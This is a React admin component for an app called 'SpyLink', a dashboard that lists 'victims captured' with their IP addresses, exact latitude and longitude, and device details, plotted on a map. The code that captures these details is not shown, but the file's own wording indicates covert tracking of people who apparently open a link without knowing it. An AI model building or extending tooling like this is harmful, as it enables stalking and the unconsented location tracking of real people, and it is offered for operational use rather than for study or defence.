import { useEffect, useState } from "react";
import axios from "axios";
import { signInWithPopup } from "firebase/auth";
import { auth, googleProvider } from "../firebase"; 
import { MapContainer, TileLayer, Marker, Popup } from "react-leaflet";
import "leaflet/dist/leaflet.css";

export default function Admin() {
  const [user, setUser] = useState(null);
  const [logs, setLogs] = useState([]);
  const [error, setError] = useState("");
  const [viewMode, setViewMode] = useState("table"); // 'map' or 'table'

  // 1. LOGIN FUNCTION
  const handleLogin = async () => {
    try {
      const result = await signInWithPopup(auth, googleProvider);
      const token = await result.user.getIdToken();
      setUser({ email: result.user.email, token });
      fetchLogs(token);
    } catch (err) {
      setError("Login Failed: " + err.message);
    }
  };

  // 2. FETCH DATA FUNCTION
  const fetchLogs = async (token) => {
    try {
      const response = await axios.get(`${import.meta.env.VITE_BACKEND_URL}/api/logs`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setLogs(response.data);
    } catch (err) {
      setError("Fetch Failed: " + (err.response?.data?.error || err.message));
    }
  };

  // 3. DELETE FUNCTION
  const handleDelete = async (id) => {
    if (!confirm("Are you sure you want to delete this log?")) return;

    try {
      await axios.delete(`${import.meta.env.VITE_BACKEND_URL}/api/logs/${id}`, {
        headers: { Authorization: `Bearer ${user.token}` }
      });

      // Remove from UI immediately
      setLogs(logs.filter(log => log._id !== id));
    } catch (err) {
      alert("Failed to delete: " + err.message);
    }
  };

  if (!user) {
    return (
      <div className="flex h-screen items-center justify-center bg-gray-900 text-white">
        <div className="text-center space-y-4">
          <h1 className="text-3xl font-bold">SpyLink Admin 🔒</h1>
          <button
            onClick={handleLogin}
            className="px-6 py-3 bg-blue-600 rounded-lg hover:bg-blue-500 font-bold cursor-pointer transition"
          >
            Sign in with Google
          </button>
          {error && <p className="text-red-500">{error}</p>}
        </div>
      </div>
    );
  }

  return (
    <div className="h-screen w-full flex flex-col bg-gray-900 text-white">
      {/* HEADER */}
      <div className="bg-gray-800 p-4 flex justify-between items-center shadow-lg z-10 border-b border-gray-700">
        <div className="flex items-center space-x-4">
          <h1 className="text-xl font-bold text-green-400">SpyLink Dashboard</h1>

          {/* TOGGLE SWITCH */}
          <div className="bg-gray-700 rounded-lg p-1 flex text-sm">
            <button
              onClick={() => setViewMode("table")}
              className={`px-3 py-1 rounded-md transition ${viewMode === "table" ? "bg-blue-600 text-white" : "text-gray-400 hover:text-white"}`}
            >
              📋 List
            </button>
            <button
              onClick={() => setViewMode("map")}
              className={`px-3 py-1 rounded-md transition ${viewMode === "map" ? "bg-blue-600 text-white" : "text-gray-400 hover:text-white"}`}
            >
              🗺️ Map
            </button>
          </div>
        </div>

        <div className="text-right">
          <p className="text-sm text-gray-400">Admin: <span className="text-white">{user.email}</span></p>
          <p className="text-xs text-gray-500">{logs.length} victims captured</p>
        </div>
      </div>

      {/* CONTENT AREA */}
      <div className="flex-1 overflow-auto relative">

        {/* MAP VIEW */}
        {viewMode === "map" && (
          <MapContainer center={[20, 0]} zoom={2} style={{ height: "100%", width: "100%" }}>
            <TileLayer
              url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
              attribution='&copy; OpenStreetMap contributors'
            />
            {logs.map((log) => (
              <Marker key={log._id} position={[log.latitude, log.longitude]}>
                <Popup>
                  <div className="text-sm text-black">
                    <p><strong>IP:</strong> {log.ipAddress}</p>
                    <p><strong>Time:</strong> {new Date(log.timestamp).toLocaleString()}</p>
                    <p><strong>Device:</strong> {log.device}</p>
                  </div>
                </Popup>
              </Marker>
            ))}
          </MapContainer>
        )}

        {/* TABLE VIEW */}
        {viewMode === "table" && (
          <div className="p-6 max-w-7xl mx-auto">
            <div className="overflow-x-auto rounded-lg border border-gray-700">
              <table className="min-w-full bg-gray-800 text-left text-sm">
                <thead className="bg-gray-700 text-gray-400 uppercase font-mono">
                  <tr>
                    <th className="px-6 py-3">Time</th>
                    <th className="px-6 py-3">IP Address</th>
                    <th className="px-6 py-3">Location (Lat/Lng)</th>
                    <th className="px-6 py-3">Device</th>
                    <th className="px-6 py-3">Action</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {logs.map((log) => (
                    <tr key={log._id} className="hover:bg-gray-750 transition">
                      <td className="px-6 py-4 whitespace-nowrap text-gray-300">
                        {new Date(log.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 font-mono text-green-400">
                        {log.ipAddress || "Unknown"}
                      </td>
                      <td className="px-6 py-4 font-mono text-yellow-500">
                        {log.latitude.toFixed(5)}, {log.longitude.toFixed(5)}
                      </td>
                      <td className="px-6 py-4 text-gray-400 max-w-xs truncate" title={log.device}>
                        {log.device || "Unknown"}
                      </td>
                      <td className="px-6 py-4 flex items-center space-x-4">
                        <a
                          href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-blue-400 hover:text-blue-300 hover:underline"
                        >
                          View Map ↗
                        </a>
                        <button
                          onClick={() => handleDelete(log._id)}
                          className="text-red-400 hover:text-red-300 hover:bg-red-900/50 p-2 rounded transition"
                          title="Delete Log"
                        >
                          🗑️
                        </button>
                      </td>
                    </tr>
                  ))}
                  {logs.length === 0 && (
                    <tr>
                      <td colSpan="5" className="px-6 py-12 text-center text-gray-500 italic">
                        No victims found... yet. 🕸️
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

      </div>
    </div>
  );
}